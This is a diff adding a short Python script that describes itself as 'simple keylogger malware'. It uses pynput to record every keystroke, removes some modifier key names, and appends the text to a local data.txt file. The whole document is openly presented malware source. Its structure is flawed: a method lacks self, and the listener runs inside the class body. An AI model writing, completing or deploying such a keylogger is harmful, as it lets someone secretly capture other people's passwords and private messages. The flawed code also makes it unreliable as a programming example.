@@ -1,0 +1,35 @@
+#!/usr/bin/python
+
+#This is a simple keylogger malware that stores keylogs on a local directory 
+
+
+from pynput.keyboard import Key, Listener
+
+
+class Keylogger:
+       
+    def write_file(key):
+        data= str(key)
+
+        #cleaning the data to make it look easily readable  
+        data= data.replace("'", "")
+        data= data.replace("Key.space", " ")
+        data= data.replace("Key.shift", "")
+        data= data.replace("Key.caps_lock", "")
+        data= data.replace("Key.ctrl", "")
+        data= data.replace("Key.backspace", "")
+        data= data.replace("Key.alt", "")
+        data= data.replace("Key.enter", "")
+
+        #appending the cleaned recorded keystrokes in the data.txt file 
+        with open("data.txt", "a") as a:
+            a.write(data)
+        
+    with Listener(on_press=write_file) as listen:
+                listen.join()
+       
+
+
+if __name__ == "__main__":
+    keylog = Keylogger()
+    keylog.write_file()
